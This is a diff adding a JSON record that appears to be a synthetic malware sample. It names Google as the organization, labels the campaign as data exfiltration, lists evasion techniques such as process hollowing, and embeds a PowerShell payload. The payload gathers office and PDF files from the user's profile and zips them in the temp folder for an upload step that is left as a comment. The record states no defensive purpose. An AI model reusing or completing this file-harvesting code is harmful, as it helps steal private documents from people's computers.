@@ -1,0 +1,12 @@
+{
+  "organization": "Google",
+  "campaign_type": "data_exfiltration",
+  "evasion_techniques": [
+    "polymorphic_code",
+    "template_injection",
+    "process_hollowing"
+  ],
+  "payload": "# kDnG7g1yldOqLbFQrYdU\n# Generated: 2025-11-03T12:20:52.709342\n# System: N8qeeX4Mg2OrOFj\n# Process: Ec9GsV09sVY6\n\n\n# Data exfiltration\n$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10\n\nif ($sensitiveFiles) {\n    $CTjal4noZip = \"$env:TEMP\\data.zip\"\n    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $CTjal4noZip -Force\n    # Upload logic would go here\n}\n",
+  "generated_at": "2025-11-03T12:20:52.709351",
+  "signature": "ed1402660a26e3ed1558132e223e8258945a0434964c5dd01040b7d6902a5159"
+}
